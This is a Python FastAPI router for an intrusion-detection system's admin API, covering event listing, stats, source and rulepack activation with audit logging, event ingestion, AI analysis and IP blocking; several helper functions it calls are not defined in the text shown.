"""IDS management API for review, reporting, and demo workflows."""
from __future__ import annotations

from collections import Counter, defaultdict
from datetime import datetime, timedelta

from fastapi import APIRouter, Depends, HTTPException, Query
from pydantic import BaseModel, Field
from sqlalchemy import func
from sqlalchemy.orm import Session

from ..api.deps import require_roles
from ..config import settings
from ..database import get_db
from ..models.ids_event import IDSEvent
from ..models.ids_rulepack import IDSRulepackActivation, IDSRulepackRuntimeState
from ..models.ids_source import IDSSource, IDSSourceSyncAttempt
from ..models.ids_source_package import IDSSourcePackageActivation, IDSSourcePackageIntake
from ..services.ids_ai_analysis import is_llm_available, run_ai_analysis_sync
from ..services.audit import write_audit_log
from ..services.ids_engine import block_ip_windows, unblock_ip_windows
from ..services.ids_ingestion import (
    DEMO_EVENT_ORIGIN,
    REAL_EVENT_ORIGIN,
    SOURCE_CUSTOM_PROJECT,
    SOURCE_EXTERNAL_MATURE,
    SOURCE_TRANSITIONAL_LOCAL,
    TEST_EVENT_ORIGIN,
    apply_source_metadata,
    build_correlation_key,
    build_event_fingerprint,
)
from ..services.ids_source_ops import (
    HEALTH_DISABLED,
    HEALTH_FAILING,
    HEALTH_HEALTHY,
    HEALTH_NEVER,
    OPERATIONAL_STATUSES,
    SOURCE_DEMO_TEST,
    SOURCE_STATUS_DISABLED,
    SOURCE_STATUS_DRAFT,
    SOURCE_STATUS_FAILING,
    SYNC_MODE_NOT_APPLICABLE,
    SYNC_MODES,
    SYNC_STATUS_FAILED,
    SYNC_STATUS_NEVER,
    SYNC_STATUS_SKIPPED,
    SYNC_STATUS_SUCCESS,
    TRUST_CLASSIFICATIONS,
    build_source_warning,
    derive_source_health_state,
    is_trusted_production_source,
    list_recent_source_activity,
    list_recent_sync_attempts,
    normalize_source_key,
)
from ..services.ids_source_packages import (
    PACKAGE_RESULT_ACTIVATED,
    PACKAGE_RESULT_FAILED,
    PACKAGE_RESULT_PREVIEWED,
    PACKAGE_RESULT_REJECTED,
    build_package_preview_summary,
    list_latest_package_activations,
    list_recent_package_activations,
    list_recent_package_intakes,
)
from ..services.ids_rulepacks import (
    DEFAULT_RULEPACK_KEY,
    RULEPACK_RESULT_ACTIVATED,
    RULEPACK_RESULT_FAILED,
    RULEPACK_RESULT_REJECTED,
    TRUST_DEMO_TEST as RULEPACK_TRUST_DEMO_TEST,
    create_rulepack_activation_record,
    ensure_runtime_state,
    get_rulepack_definition,
    list_rulepack_catalog,
    resolve_active_rulepack_key_from_db,
    set_runtime_active_rulepack_key,
    update_runtime_state,
)

router = APIRouter(prefix="/ids", tags=["ids"])
_admin = require_roles("system_admin")


class ArchiveBatchRequest(BaseModel):
    event_ids: list[int] = []


class UpdateStatusRequest(BaseModel):
    status: str
    review_note: str = ""


class DemoSeedRequest(BaseModel):
    auto_analyze: bool = True


class IngestRawEvidence(BaseModel):
    method: str = ""
    path: str = ""
    query_snippet: str = ""
    body_snippet: str = ""
    user_agent: str = ""
    headers_snippet: str = ""


class IngestEventRequest(BaseModel):
    event_origin: str
    source_classification: str
    detector_family: str
    detector_name: str
    rule_id: str = ""
    rule_name: str = ""
    source_version: str = ""
    source_freshness: str = "unknown"
    occurred_at: datetime
    client_ip: str
    asset_ref: str = ""
    attack_type: str
    severity: str = "medium"
    confidence: int = Field(..., ge=0, le=100)
    event_fingerprint: str = ""
    correlation_key: str = ""
    evidence_summary: str = ""
    raw_evidence: IngestRawEvidence | None = None


class SourceRegistryRequest(BaseModel):
    source_key: str
    display_name: str
    trust_classification: str
    detector_family: str
    operational_status: str = "enabled"
    freshness_target_hours: int = Field(..., ge=1, le=720)
    sync_mode: str = "manual"
    provenance_note: str = ""


class SourceSyncRequest(BaseModel):
    triggered_by: str
    reason: str = ""


class SourcePackagePreviewRequest(BaseModel):
    source_key: str
    package_version: str
    release_timestamp: datetime | None = None
    trust_classification: str
    detector_family: str
    provenance_note: str = ""
    triggered_by: str


class SourcePackageActivationRequest(BaseModel):
    package_intake_id: int
    triggered_by: str
    activation_note: str = ""


class RulepackActivationRequest(BaseModel):
    rulepack_key: str
    triggered_by: str
    activation_note: str = ""


@router.get("/events")
def list_ids_events(
    attack_type: str | None = Query(None),
    client_ip: str | None = Query(None),
    blocked: int | None = Query(None),
    archived: int | None = Query(None),
    status: str | None = Query(None),
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    min_score: int | None = Query(None, ge=0, le=100),
    limit: int = Query(50, ge=1, le=200),
    offset: int = Query(0, ge=0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    q = _filtered_ids_query(
        db,
        attack_type=attack_type,
        client_ip=client_ip,
        blocked=blocked,
        archived=archived,
        status=status,
        event_origin=event_origin,
        source_classification=source_classification,
        min_score=min_score,
    ).order_by(IDSEvent.created_at.desc())

    total = q.count()
    rows = q.offset(offset).limit(limit).all()
    return {"total": total, "items": [_serialize_ids_event(row) for row in rows]}


@router.get("/stats")
def ids_stats(
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    q = _filtered_ids_query(
        db,
        event_origin=event_origin,
        source_classification=source_classification,
    )
    total = q.count()
    blocked_count = q.filter(IDSEvent.blocked == 1).count()
    high_risk_count = q.filter(IDSEvent.risk_score >= 70).count()
    by_type = (
        q.with_entities(IDSEvent.attack_type, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.attack_type)
        .all()
    )
    by_status = (
        q.with_entities(IDSEvent.status, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.status)
        .all()
    )
    by_origin = (
        q.with_entities(IDSEvent.event_origin, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.event_origin)
        .all()
    )
    return {
        "total": total,
        "blocked_count": blocked_count,
        "high_risk_count": high_risk_count,
        "by_type": [
            {"attack_type": attack_type, "attack_type_label": _attack_type_label(attack_type), "count": count}
            for attack_type, count in by_type
        ],
        "by_status": [{"status": status or "new", "count": count} for status, count in by_status],
        "by_origin": [{"event_origin": origin or REAL_EVENT_ORIGIN, "count": count} for origin, count in by_origin],
    }


@router.get("/stats/trend")
def ids_stats_trend(
    days: int = Query(7, ge=1, le=90),
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    start = datetime.utcnow() - timedelta(days=days)
    rows = (
        _filtered_ids_query(
            db,
            event_origin=event_origin,
            source_classification=source_classification,
        )
        .filter(IDSEvent.created_at >= start)
        .all()
    )

    by_date: dict[str, int] = defaultdict(int)
    for row in rows:
        if row.created_at:
            by_date[row.created_at.strftime("%Y-%m-%d")] += 1

    dates: list[str] = []
    counts: list[int] = []
    for idx in range(days):
        day = (datetime.utcnow() - timedelta(days=days - 1 - idx)).strftime("%Y-%m-%d")
        dates.append(day)
        counts.append(by_date.get(day, 0))
    return {"dates": dates, "counts": counts}


@router.get("/sources")
def list_ids_sources(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    rows = (
        db.query(IDSSource)
        .order_by(IDSSource.updated_at.desc(), IDSSource.id.desc())
        .all()
    )
    activity_map = list_recent_source_activity(db, [row.source_key or "" for row in rows])
    attempts_map = list_recent_sync_attempts(db, [int(row.id) for row in rows])
    intake_map = list_recent_package_intakes(db, [int(row.id) for row in rows])
    activation_map = list_latest_package_activations(db, [int(row.id) for row in rows])
    items = [
        _serialize_ids_source(
            row,
            activity=activity_map.get(row.source_key or ""),
            attempts=attempts_map.get(int(row.id), []),
            package_intakes=intake_map.get(int(row.id), []),
            package_activation=activation_map.get(int(row.id)),
        )
        for row in rows
    ]
    return {"total": len(items), "items": items, "summary": _summarize_sources(items)}


@router.post("/sources")
def create_ids_source(
    req: SourceRegistryRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    payload = _validate_source_registry_request(req, db=db)
    source = IDSSource(
        source_key=payload["source_key"],
        display_name=payload["display_name"],
        trust_classification=payload["trust_classification"],
        detector_family=payload["detector_family"],
        operational_status=payload["operational_status"],
        freshness_target_hours=payload["freshness_target_hours"],
        sync_mode=payload["sync_mode"],
        provenance_note=payload["provenance_note"],
        last_sync_status=SYNC_STATUS_NEVER,
        last_sync_detail="Awaiting first sync.",
    )
    db.add(source)
    db.commit()
    db.refresh(source)
    return _serialize_ids_source(source, activity={}, attempts=[], package_intakes=[], package_activation=None)


@router.put("/sources/{source_id}")
def update_ids_source(
    source_id: int,
    req: SourceRegistryRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    source = _get_source_or_404(db, source_id)
    payload = _validate_source_registry_request(req, db=db, source_id=source_id)
    source.source_key = payload["source_key"]
    source.display_name = payload["display_name"]
    source.trust_classification = payload["trust_classification"]
    source.detector_family = payload["detector_family"]
    source.operational_status = payload["operational_status"]
    source.freshness_target_hours = payload["freshness_target_hours"]
    source.sync_mode = payload["sync_mode"]
    source.provenance_note = payload["provenance_note"]
    db.commit()
    db.refresh(source)
    activity_map = list_recent_source_activity(db, [source.source_key or ""])
    attempts_map = list_recent_sync_attempts(db, [int(source.id)])
    intake_map = list_recent_package_intakes(db, [int(source.id)])
    activation_map = list_latest_package_activations(db, [int(source.id)])
    return _serialize_ids_source(
        source,
        activity=activity_map.get(source.source_key or ""),
        attempts=attempts_map.get(int(source.id), []),
        package_intakes=intake_map.get(int(source.id), []),
        package_activation=activation_map.get(int(source.id)),
    )


@router.post("/sources/{source_id}/sync")
def trigger_ids_source_sync(
    source_id: int,
    req: SourceSyncRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    source = _get_source_or_404(db, source_id)
    triggered_by = (req.triggered_by or "").strip()[:64]
    reason = (req.reason or "").strip()[:500]
    if not triggered_by:
        raise HTTPException(status_code=400, detail="triggered_by is required")

    started_at = datetime.utcnow()
    result_status = SYNC_STATUS_SUCCESS
    detail = reason or "Metadata refresh completed."

    if source.operational_status == SOURCE_STATUS_DISABLED:
        result_status = SYNC_STATUS_SKIPPED
        detail = reason or "Skipped because the source is disabled."
    elif source.operational_status == SOURCE_STATUS_DRAFT:
        result_status = SYNC_STATUS_SKIPPED
        detail = reason or "Skipped because the source is still in draft state."
    elif source.sync_mode == SYNC_MODE_NOT_APPLICABLE:
        result_status = SYNC_STATUS_SKIPPED
        detail = reason or "Skipped because sync is not applicable for this source."
    elif source.operational_status == SOURCE_STATUS_FAILING:
        result_status = SYNC_STATUS_FAILED
        detail = reason or "Sync failed because the source is currently marked failing."

    if result_status == SYNC_STATUS_SUCCESS:
        source.last_synced_at = started_at
        source.last_sync_status = SYNC_STATUS_SUCCESS
        source.last_sync_detail = detail
    else:
        if not source.last_sync_status:
            source.last_sync_status = SYNC_STATUS_NEVER
        source.last_sync_status = result_status
        source.last_sync_detail = detail

    health_state = derive_source_health_state(source, now=started_at)
    attempt = IDSSourceSyncAttempt(
        source_id=source.id,
        started_at=started_at,
        finished_at=started_at,
        result_status=result_status,
        detail=detail,
        freshness_after_sync=health_state,
        triggered_by=triggered_by,
    )
    db.add(attempt)
    db.commit()
    db.refresh(source)
    db.refresh(attempt)

    activity_map = list_recent_source_activity(db, [source.source_key or ""])
    attempts_map = list_recent_sync_attempts(db, [int(source.id)])
    intake_map = list_recent_package_intakes(db, [int(source.id)])
    activation_map = list_latest_package_activations(db, [int(source.id)])
    serialized = _serialize_ids_source(
        source,
        activity=activity_map.get(source.source_key or ""),
        attempts=attempts_map.get(int(source.id), []),
        package_intakes=intake_map.get(int(source.id), []),
        package_activation=activation_map.get(int(source.id)),
    )
    _write_ids_audit_log(
        db,
        current_user=current_user,
        action="ids_source_sync",
        target_type="ids_source",
        target_id=source.source_key or str(source.id),
        detail=(
            f"triggered_by={triggered_by}; result={attempt.result_status}; "
            f"health={serialized['health_state']}; detail={attempt.detail or ''}"
        )[:512],
    )
    db.commit()
    return {
        "source_id": source.id,
        "sync_attempt_id": attempt.id,
        "result_status": attempt.result_status,
        "health_state": serialized["health_state"],
        "last_synced_at": serialized["last_synced_at"],
        "detail": attempt.detail or "",
        "source": serialized,
    }


@router.post("/source-packages/preview")
def preview_ids_source_package(
    req: SourcePackagePreviewRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    source_key = normalize_source_key(req.source_key)
    package_version = (req.package_version or "").strip()[:64]
    trust_classification = (req.trust_classification or "").strip()
    detector_family = (req.detector_family or "").strip()[:32]
    provenance_note = (req.provenance_note or "").strip()[:2000]
    triggered_by = (req.triggered_by or "").strip()[:64]

    if not source_key:
        raise HTTPException(status_code=400, detail="source_key is required")
    if not package_version:
        raise HTTPException(status_code=400, detail="package_version is required")
    if trust_classification not in TRUST_CLASSIFICATIONS:
        raise HTTPException(status_code=400, detail=f"Invalid trust_classification: {trust_classification}")
    if not detector_family:
        raise HTTPException(status_code=400, detail="detector_family is required")
    if not triggered_by:
        raise HTTPException(status_code=400, detail="triggered_by is required")

    source = db.query(IDSSource).filter(IDSSource.source_key == source_key).first()
    if not source:
        intake = IDSSourcePackageIntake(
            source_id=None,
            source_key=source_key,
            package_version=package_version,
            release_timestamp=req.release_timestamp,
            trust_classification=trust_classification,
            detector_family=detector_family,
            provenance_note=provenance_note,
            intake_result=PACKAGE_RESULT_REJECTED,
            intake_detail=f"source_key not found: {source_key}",
            triggered_by=triggered_by,
        )
        db.add(intake)
        db.commit()
        _write_ids_audit_log(
            db,
            current_user=current_user,
            action="ids_source_package_preview_rejected",
            target_type="ids_source_package",
            target_id=f"{source_key}:{package_version}",
            detail=(
                f"triggered_by={triggered_by}; trust={trust_classification}; "
                f"reason=source_key_not_found"
            )[:512],
        )
        db.commit()
        raise HTTPException(status_code=400, detail=f"source_key not found: {source_key}")

    latest_activation_map = list_latest_package_activations(db, [int(source.id)])
    preview = build_package_preview_summary(
        source,
        package_version=package_version,
        release_timestamp=req.release_timestamp,
        provenance_note=provenance_note,
        active_activation=latest_activation_map.get(int(source.id)),
    )
    intake = IDSSourcePackageIntake(
        source_id=source.id,
        source_key=source_key,
        package_version=package_version,
        release_timestamp=req.release_timestamp,
        trust_classification=trust_classification,
        detector_family=detector_family,
        provenance_note=provenance_note,
        intake_result=PACKAGE_RESULT_PREVIEWED,
        intake_detail=preview["version_change_state"],
        triggered_by=triggered_by,
    )
    db.add(intake)
    db.commit()
    db.refresh(intake)
    _write_ids_audit_log(
        db,
        current_user=current_user,
        action="ids_source_package_preview",
        target_type="ids_source_package",
        target_id=f"{source_key}:{package_version}",
        detail=(
            f"triggered_by={triggered_by}; trust={trust_classification}; "
            f"change={preview['version_change_state']}; fields={','.join(preview['changed_fields']) or '-'}"
        )[:512],
    )
    db.commit()
    return {
        "package_intake_id": intake.id,
        "source_id": preview["source_id"],
        "source_key": preview["source_key"],
        "package_version": preview["package_version"],
        "version_change_state": preview["version_change_state"],
        "changed_fields": preview["changed_fields"],
        "visible_warning": preview["visible_warning"],
        "intake_result": intake.intake_result,
    }


@router.post("/source-packages/activate")
def activate_ids_source_package(
    req: SourcePackageActivationRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    triggered_by = (req.triggered_by or "").strip()[:64]
    activation_note = (req.activation_note or "").strip()[:1000]
    if not triggered_by:
        raise HTTPException(status_code=400, detail="triggered_by is required")

    intake = db.query(IDSSourcePackageIntake).filter(IDSSourcePackageIntake.id == req.package_intake_id).first()
    if not intake:
        _write_ids_audit_log(
            db,
            current_user=current_user,
            action="ids_source_package_activate_rejected",
            target_type="ids_source_package",
            target_id=str(req.package_intake_id),
            detail=f"triggered_by={triggered_by}; reason=package_intake_not_found"[:512],
        )
        db.commit()
        raise HTTPException(status_code=404, detail="Package intake not found")
    if intake.source_id is None:
        detail = _build_activation_failure_detail(
            "Rejected package previews cannot be activated",
            activation_note=activation_note,
        )
        _record_failed_package_activation(intake, detail=detail, triggered_by=triggered_by, db=db)
        _write_ids_audit_log(
            db,
            current_user=current_user,
            action="ids_source_package_activate_rejected",
            target_type="ids_source_package",
            target_id=f"{intake.source_key or '-'}:{intake.package_version or '-'}",
            detail=(f"triggered_by={triggered_by}; reason={detail}")[:512],
        )
        db.commit()
        raise HTTPException(status_code=400, detail="Rejected package previews cannot be activated")
    if (intake.trust_classification or "").strip() == SOURCE_DEMO_TEST:
        detail = _build_activation_failure_detail(
            "demo_test packages cannot be activated as trusted coverage",
            activation_note=activation_note,
        )
        _record_failed_package_activation(intake, detail=detail, triggered_by=triggered_by, db=db)
        _write_ids_audit_log(
            db,
            current_user=current_user,
            action="ids_source_package_activate_rejected",
            target_type="ids_source_package",
            target_id=f"{intake.source_key or '-'}:{intake.package_version or '-'}",
            detail=(f"triggered_by={triggered_by}; reason={detail}")[:512],
        )
        db.commit()
        raise HTTPException(status_code=400, detail="demo_test packages cannot be activated as trusted coverage")

    source = _get_source_or_404(db, int(intake.source_id))
    latest_activation_map = list_latest_package_activations(db, [int(source.id)])
    latest_activation = latest_activation_map.get(int(source.id))
    if latest_activation and (latest_activation.package_version or "") == (intake.package_version or ""):
        detail = activation_note or "Package version already active; activation re-recorded."
    else:
        detail = activation_note or "Reviewed package version activated."

    activation = IDSSourcePackageActivation(
        source_id=source.id,
        package_intake_id=intake.id,
        package_version=intake.package_version,
        activated_by=triggered_by,
        activation_detail=detail,
    )
    intake.intake_result = PACKAGE_RESULT_ACTIVATED
    intake.intake_detail = detail
    db.add(activation)
    db.commit()
    db.refresh(activation)
    _write_ids_audit_log(
        db,
        current_user=current_user,
        action="ids_source_package_activate",
        target_type="ids_source_package",
        target_id=f"{source.source_key or source.id}:{activation.package_version or '-'}",
        detail=(f"triggered_by={triggered_by}; result={PACKAGE_RESULT_ACTIVATED}; note={detail}")[:512],
    )
    db.commit()

    return {
        "source_id": source.id,
        "package_activation_id": activation.id,
        "package_version": activation.package_version or "",
        "result_status": PACKAGE_RESULT_ACTIVATED,
        "active_package_version": activation.package_version or "",
        "detail": activation.activation_detail or "",
    }


@router.get("/source-packages")
def list_ids_source_packages(
    source_id: int | None = Query(None, ge=1),
    source_key: str | None = Query(None),
    limit: int = Query(5, ge=1, le=20),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    # Keep package-history queries source-scoped and bounded so reviewers can
    # inspect intake failures and trusted activations without leaving IDS.
    normalized_source_key = normalize_source_key(source_key or "")
    if source_id is not None:
        source = _get_source_or_404(db, source_id)
        intake_map = list_recent_package_intakes(db, [int(source.id)], limit_per_source=limit)
        activation_map = list_recent_package_activations(db, [int(source.id)], limit_per_source=limit)
        item = _build_source_package_history_item(
            source,
            intakes=intake_map.get(int(source.id), []),
            activations=activation_map.get(int(source.id), []),
        )
        return {"total": 1, "items": [item]}

    if normalized_source_key:
        source = db.query(IDSSource).filter(IDSSource.source_key == normalized_source_key).first()
        if source:
            intake_map = list_recent_package_intakes(db, [int(source.id)], limit_per_source=limit)
            activation_map = list_recent_package_activations(db, [int(source.id)], limit_per_source=limit)
            item = _build_source_package_history_item(
                source,
                intakes=intake_map.get(int(source.id), []),
                activations=activation_map.get(int(source.id), []),
            )
            return {"total": 1, "items": [item]}

        orphaned_intakes = (
            db.query(IDSSourcePackageIntake)
            .filter(IDSSourcePackageIntake.source_key == normalized_source_key)
            .filter(IDSSourcePackageIntake.source_id.is_(None))
            .order_by(IDSSourcePackageIntake.created_at.desc(), IDSSourcePackageIntake.id.desc())
            .limit(limit)
            .all()
        )
        if orphaned_intakes:
            return {
                "total": 1,
                "items": [
                    {
                        "source": None,
                        "source_key": normalized_source_key,
                        "active_package_version": "",
                        "active_package_activated_at": None,
                        "active_package_activated_by": "",
                        "recent_intakes": [_serialize_source_package_intake(intake) for intake in orphaned_intakes],
                        "recent_activations": [],
                    }
                ],
            }
        raise HTTPException(status_code=404, detail=f"source_key not found: {normalized_source_key}")

    rows = (
        db.query(IDSSource)
        .order_by(IDSSource.updated_at.desc(), IDSSource.id.desc())
        .all()
    )
    source_ids = [int(row.id) for row in rows]
    intake_map = list_recent_package_intakes(db, source_ids, limit_per_source=limit)
    activation_map = list_recent_package_activations(db, source_ids, limit_per_source=limit)
    items = [
        _build_source_package_history_item(
            row,
            intakes=intake_map.get(int(row.id), []),
            activations=activation_map.get(int(row.id), []),
        )
        for row in rows
    ]
    return {"total": len(items), "items": items}


@router.get("/rule-packs")
def list_ids_rulepacks(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    active_rulepack_key = resolve_active_rulepack_key_from_db(db)
    runtime_state = ensure_runtime_state(db)
    return {
        "active_rulepack_key": active_rulepack_key,
        "runtime_state": _serialize_rulepack_runtime_state(runtime_state),
        "items": list_rulepack_catalog(),
    }


@router.post("/rule-packs/activate")
def activate_ids_rulepack(
    req: RulepackActivationRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    rulepack_key = (req.rulepack_key or "").strip()
    triggered_by = (req.triggered_by or "").strip()[:64]
    activation_note = (req.activation_note or "").strip()[:1000]

    if not rulepack_key:
        raise HTTPException(status_code=400, detail="rulepack_key is required")
    if not triggered_by:
        raise HTTPException(status_code=400, detail="triggered_by is required")

    definition = get_rulepack_definition(rulepack_key)
    if not definition:
        detail = f"Unknown rulepack_key: {rulepack_key}"
        activation = create_rulepack_activation_record(
            db,
            rulepack_key=rulepack_key,
            result_status=RULEPACK_RESULT_FAILED,
            triggered_by=triggered_by,
            activation_detail=detail,
        )
        _write_ids_audit_log(
            db,
            current_user=current_user,
            action="ids_rulepack_activate_failed",
            target_type="ids_rulepack",
            target_id=rulepack_key,
            detail=(f"triggered_by={triggered_by}; activation_id={activation.id}; reason={detail}")[:512],
        )
        db.commit()
        raise HTTPException(
            status_code=400,
            detail={
                "message": detail,
                "activation_id": activation.id,
            },
        )

    if (definition.get("trust_classification") or "").strip() == RULEPACK_TRUST_DEMO_TEST:
        detail = "demo_test rulepacks cannot be activated as trusted runtime coverage"
        activation = create_rulepack_activation_record(
            db,
            rulepack_key=rulepack_key,
            result_status=RULEPACK_RESULT_REJECTED,
            triggered_by=triggered_by,
            activation_detail=f"{detail}. {activation_note}".strip(),
        )
        _write_ids_audit_log(
            db,
            current_user=current_user,
            action="ids_rulepack_activate_rejected",
            target_type="ids_rulepack",
            target_id=rulepack_key,
            detail=(f"triggered_by={triggered_by}; activation_id={activation.id}; reason={detail}")[:512],
        )
        db.commit()
        raise HTTPException(
            status_code=400,
            detail={
                "message": detail,
                "activation_id": activation.id,
            },
        )

    current_key = resolve_active_rulepack_key_from_db(db)
    if current_key == rulepack_key:
        detail = activation_note or "Rulepack already active; activation re-recorded."
    else:
        detail = activation_note or "Rulepack activated for inline IDS matcher."

    update_runtime_state(
        db,
        active_rulepack_key=rulepack_key,
        updated_by=triggered_by,
        update_note=detail,
    )
    activation = create_rulepack_activation_record(
        db,
        rulepack_key=rulepack_key,
        result_status=RULEPACK_RESULT_ACTIVATED,
        triggered_by=triggered_by,
        activation_detail=detail,
    )
    set_runtime_active_rulepack_key(rulepack_key)
    _write_ids_audit_log(
        db,
        current_user=current_user,
        action="ids_rulepack_activate",
        target_type="ids_rulepack",
        target_id=rulepack_key,
        detail=(f"triggered_by={triggered_by}; activation_id={activation.id}; note={detail}")[:512],
    )
    db.commit()
    return {
        "result_status": RULEPACK_RESULT_ACTIVATED,
        "active_rulepack_key": rulepack_key,
        "rulepack_key": rulepack_key,
        "activation_id": activation.id,
        "detail": detail,
    }


@router.get("/rule-packs/activations")
def list_ids_rulepack_activations(
    limit: int = Query(20, ge=1, le=100),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    rows = (
        db.query(IDSRulepackActivation)
        .order_by(IDSRulepackActivation.created_at.desc(), IDSRulepackActivation.id.desc())
        .limit(limit)
        .all()
    )
    total = db.query(func.count(IDSRulepackActivation.id)).scalar() or 0
    active_rulepack_key = resolve_active_rulepack_key_from_db(db)
    return {
        "total": int(total),
        "active_rulepack_key": active_rulepack_key,
        "items": [_serialize_rulepack_activation(row) for row in rows],
    }


@router.post("/events/ingest")
def ingest_ids_event(
    req: IngestEventRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    # Keep normalized event ingestion aligned with trusted-source provenance
    # without introducing registry-only demo/test source classes into events.
    allowed_origins = {REAL_EVENT_ORIGIN, DEMO_EVENT_ORIGIN, TEST_EVENT_ORIGIN}
    allowed_sources = {
        SOURCE_EXTERNAL_MATURE,
        SOURCE_CUSTOM_PROJECT,
        SOURCE_TRANSITIONAL_LOCAL,
    }
    event_origin = (req.event_origin or "").strip()
    source_classification = (req.source_classification or "").strip()
    detector_family = (req.detector_family or "").strip()
    detector_name = (req.detector_name or "").strip()
    attack_type = (req.attack_type or "").strip()

    if event_origin not in allowed_origins:
        raise HTTPException(status_code=400, detail=f"Invalid event_origin: {event_origin}")
    if source_classification not in allowed_sources:
        raise HTTPException(status_code=400, detail=f"Invalid source_classification: {source_classification}")
    if not detector_family or not detector_name or not attack_type:
        raise HTTPException(status_code=400, detail="detector_family, detector_name, and attack_type are required")
    if event_origin in {REAL_EVENT_ORIGIN, DEMO_EVENT_ORIGIN} and not (req.event_fingerprint or "").strip():
        raise HTTPException(status_code=400, detail="event_fingerprint is required for real and demo events")
    if req.raw_evidence is None and not (req.evidence_summary or "").strip():
        raise HTTPException(status_code=400, detail="evidence_summary is required when raw_evidence is omitted")

    raw_evidence = req.raw_evidence or IngestRawEvidence()
    method = (raw_evidence.method or "").strip().upper()
    path = (raw_evidence.path or req.asset_ref or "").strip()
    event_fingerprint = (
        (req.event_fingerprint or "").strip()
        or build_event_fingerprint(req.client_ip, method, path, attack_type, req.rule_id)
    )
    correlation_key = (
        (req.correlation_key or "").strip()
        or build_correlation_key(req.occurred_at, req.client_ip, attack_type, detector_name)
    )
    matched = _find_correlated_ingested_event(
        db,
        event_origin=event_origin,
        event_fingerprint=event_fingerprint,
        correlation_key=correlation_key,
        occurred_at=req.occurred_at,
    )

    if matched:
        _merge_ingested_event(
            matched,
            req=req,
            raw_evidence=raw_evidence,
            event_fingerprint=event_fingerprint,
            correlation_key=correlation_key,
        )
        db.commit()
        db.refresh(matched)
        incident = matched
    else:
        incident = IDSEvent(
            client_ip=(req.client_ip or "")[:64],
            attack_type=attack_type,
            signature_matched=((req.rule_name or req.rule_id or req.evidence_summary or attack_type)[:128]),
            method=method[:16],
            path=path[:512],
            query_snippet=(raw_evidence.query_snippet or "")[:500],
            body_snippet=(raw_evidence.body_snippet or "")[:500],
            user_agent=(raw_evidence.user_agent or "")[:512],
            headers_snippet=(raw_evidence.headers_snippet or "")[:1000],
            blocked=0,
            firewall_rule="",
            archived=0,
            status="new",
            review_note="",
            action_taken=f"ingested::{source_classification}",
            response_result="record_only",
            response_detail=((req.evidence_summary or "normalized_ingest")[:1000]),
            risk_score=_severity_to_risk_score(req.severity, req.confidence),
            confidence=int(req.confidence or 0),
            hit_count=1,
            detect_detail=_build_ingested_detect_detail(req, raw_evidence),
        )
        incident.created_at = req.occurred_at
        apply_source_metadata(
            incident,
            event_origin=event_origin,
            source_classification=source_classification,
            detector_family=detector_family,
            detector_name=detector_name,
            source_rule_id=req.rule_id,
            source_rule_name=req.rule_name,
            source_version=req.source_version,
            source_freshness=req.source_freshness,
            occurred_at=req.occurred_at,
            event_fingerprint=event_fingerprint,
            correlation_key=correlation_key,
        )
        db.add(incident)
        db.commit()
        db.refresh(incident)

    return {
        "incident_id": incident.id,
        "correlation_key": incident.correlation_key or correlation_key,
        "linked_event_count": int(incident.hit_count or 1),
        "counted_in_real_metrics": (incident.event_origin or REAL_EVENT_ORIGIN) == REAL_EVENT_ORIGIN,
        "status": incident.status or "new",
    }


@router.put("/events/{event_id}/archive")
def archive_event(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    evt.archived = 1
    evt.status = "closed"
    evt.response_result = "success"
    evt.response_detail = "archived_by_operator"
    db.commit()
    return {"code": 200, "message": "Event archived"}


@router.post("/events/{event_id}/analyze")
def analyze_event_ai(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    if not settings.IDS_AI_ANALYSIS:
        raise HTTPException(status_code=400, detail="IDS_AI_ANALYSIS is disabled")
    if not is_llm_available():
        raise HTTPException(status_code=400, detail="No supported LLM configuration is available")
    _get_event_or_404(db, event_id)
    run_ai_analysis_sync(event_id)
    evt = _get_event_or_404(db, event_id)
    return {
        "code": 200,
        "message": "AI analysis completed",
        "ai_risk_level": evt.ai_risk_level or "",
        "ai_analysis": (evt.ai_analysis or "")[:4000],
        "ai_confidence": int(evt.ai_confidence or 0),
        "ai_analyzed_at": evt.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if evt.ai_analyzed_at else None,
    }


@router.put("/events/{event_id}/status")
def update_event_status(
    event_id: int,
    req: UpdateStatusRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    allowed = {"new", "investigating", "mitigated", "false_positive", "closed"}
    status = (req.status or "").strip()
    if status not in allowed:
        raise HTTPException(status_code=400, detail=f"Invalid status: {status}")
    evt = _get_event_or_404(db, event_id)
    evt.status = status
    evt.review_note = (req.review_note or "")[:2000]
    evt.response_result = "success"
    evt.response_detail = f"status_updated::{status}"
    db.commit()
    return {"code": 200, "message": "Status updated", "status": evt.status}


@router.post("/events/{event_id}/block")
def block_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    ok, msg = block_ip_windows(evt.client_ip or "")
    if ok:
        evt.blocked = 1
    evt.firewall_rule = msg[:256]
    evt.action_taken = "manual_block" if ok else "manual_block_failed"
    evt.response_result = "success" if ok else "failed"
    evt.response_detail = msg[:1000]
    db.commit()
    return {"code": 200, "message": "Block executed" if ok else f"Block failed: {msg}", "ok": ok, "rule": msg}
